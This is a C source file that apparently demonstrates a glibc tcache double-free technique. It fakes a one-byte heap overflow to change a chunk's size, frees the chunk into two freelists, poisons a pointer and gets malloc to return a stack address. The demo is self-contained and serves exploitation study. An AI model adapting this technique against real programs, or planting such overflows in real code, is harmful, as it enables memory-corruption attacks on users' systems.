#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * tcache dup demonstration                              *
 * requirements: have a uaf pointer on tcache chunk;     *
 *               able to overwrite the size of the chunk;*
 * you don't need: the ability to overwrite tcache key   *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
int main(void) {
    setbuf(stdout, NULL);

    puts("\nStep 1: prepare victim chunk and put some other on freelist");
    char *overflowp = malloc(0x18);
    size_t *victim = malloc(0x58);
    size_t *on_chain = malloc(0x58);
    free(on_chain);
    printf("overflow = %p\n", overflowp);
    printf("victim@0x61 = %p\n", victim);
    puts("Another chunk freed");

    puts("\nStep 2: overwrite the size of victim to put it in two freelists");
    /* VULNERABILITY */
    // assume you have one byte overflow
    puts("Trick free that victim is 0x31 in size");
    overflowp[0x18] = 0x31;
    free(victim);
    puts("Then set size back to 0x61");
    overflowp[0x18] = 0x61;
    free(victim);
    /* VULNERABILITY */

    printf("victim->fd = %#lx\n", *victim);
    printf("Should be previously freed chunk %p\n", on_chain);

    size_t some_var = 0;
    puts("\nStep 3: allocate back victim@0x31 to modify fd to stack var");
    printf("some_var = %#lx\n", some_var);
    size_t *victim_0x31 = malloc(0x28);
    printf("victim_0x31 = %p\n", victim_0x31);
    *victim_0x31 = (size_t)&some_var;
    printf("*victim_0x31 = %p\n", &some_var);

    puts("\nStep 4: allocate twice victim@0x61 to get access to stack var");
    size_t *victim_0x61 = malloc(0x58);
    printf("victim_0x61 = %p\n", victim_0x61);
    size_t *ptr = malloc(0x58);
    printf("Finally we got %p, set it to 0x1337\n", ptr);
    *ptr = 0x1337;
    printf("some_var = %#lx\n", some_var);
    
    return 0;

    /* credit: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=eff1f680cffb005a5623d1c8a952d095b988d6a2
    *
    * Reason of this hack: the double free check on tcache only examine the freelist
    * for the exact size of the chunk we freed. By resetting the size of the chunk,
    * we cheat glibc that the chunk is not freed yet, so we can free it in two freelists.
    */
}
